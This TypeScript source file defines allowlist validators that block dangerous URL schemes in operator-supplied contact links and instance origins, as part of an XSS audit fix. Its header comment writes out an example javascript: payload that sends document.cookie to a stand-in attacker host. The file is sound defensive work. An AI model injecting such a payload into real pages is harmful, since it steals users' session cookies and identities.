/**
 * URL-scheme allowlist for operator-supplied `contact_url`
 * values that get rendered as `<a href={...}>`.
 *
 * Origin: BATCH14-7 audit fix.  An operator can publish any
 * string as `contact_url` via the `morphit_operator_register_v1`
 * op (and, if a hypothetical future `morphit_instance_v1` op
 * lands per the REVISIT-LIST federated-discovery enhancement,
 * via that path too).  The indexer's op validator applies a URL
 * regex on intake but doesn't enforce the scheme allowlist —
 * defense-in-depth: re-validate before rendering.
 *
 * Without this guard, a malicious operator could set
 * `contact_url=javascript:fetch('//attacker.example/?'+document.cookie)`.
 * Any user clicking the operator's name in the footer (or the
 * "report this instance" link, or the operator profile in
 * `/operators`) would execute that JavaScript in the user's
 * browser session — running with full access to the user's
 * unlocked-keystore live identity.
 *
 * Schemes covered:
 *   - https / http  → web (http permitted because Tor / I2P /
 *     Lokinet onion contact pages legitimately serve plain
 *     HTTP — those connections inherit network-level transport
 *     security, not TLS's)
 *   - mailto        → email
 *   - matrix        → federated chat (Matrix)
 *   - xmpp          → federated chat (XMPP)
 *   - nostr         → federated chat (Nostr)
 *
 * Schemes explicitly NOT permitted: `javascript:`, `data:`,
 * `vbscript:`, `file:`, plus any custom-scheme that could be
 * intercepted by a browser extension or OS handler.
 *
 * Note: this validator does NOT verify URL CONTENT beyond the
 * scheme.  A `https://evil-morphit.io` link still passes —
 * that's the operator-trust boundary, separate from the scheme
 * hole this fix closes.
 */

const SAFE_CONTACT_SCHEMES = ['https:', 'http:', 'mailto:', 'matrix:', 'xmpp:', 'nostr:'] as const;

/**
 * Normalize a contact_url string and return it if its scheme is in
 * the allowlist; null otherwise.
 *
 * Whitespace trimming defends against operator typos that could
 * smuggle a leading `\tjavascript:` past a substring startsWith()
 * check.  The URL parser is the primary detector; the manual
 * scheme-extract is only a fallback for `mailto:` / `xmpp:` /
 * `nostr:` schemes that the WHATWG URL constructor refuses
 * without a base.
 */
export function safeContactUrl(raw: string | null | undefined): string | null {
	if (raw === null || raw === undefined) return null;
	const trimmed = raw.trim();
	if (trimmed.length === 0) return null;
	let scheme: string | null = null;
	try {
		scheme = new URL(trimmed).protocol;
	} catch {
		const colonIdx = trimmed.indexOf(':');
		if (colonIdx <= 0) return null;
		scheme = trimmed.slice(0, colonIdx + 1).toLowerCase();
	}
	if (scheme === null) return null;
	const ok = (SAFE_CONTACT_SCHEMES as readonly string[]).includes(scheme);
	return ok ? trimmed : null;
}

/**
 * Same scheme allowlist applied to instance origins.  Origins
 * are stricter (only http/https — federation transport requires
 * an HTTP-fetchable endpoint) so this is a tighter validator.
 *
 * Used at `/instances` rendering, where the federation directory
 * lists each instance's origin as a clickable link.  An operator
 * publishing `origin=javascript:...` to the directory would
 * otherwise XSS every user who visits /instances.
 */
const SAFE_ORIGIN_SCHEMES = ['https:', 'http:'] as const;

export function safeInstanceOrigin(raw: string | null | undefined): string | null {
	if (raw === null || raw === undefined) return null;
	const trimmed = raw.trim();
	if (trimmed.length === 0) return null;
	let scheme: string | null = null;
	try {
		scheme = new URL(trimmed).protocol;
	} catch {
		return null; // origins must be parseable URLs
	}
	const ok = (SAFE_ORIGIN_SCHEMES as readonly string[]).includes(scheme);
	return ok ? trimmed : null;
}
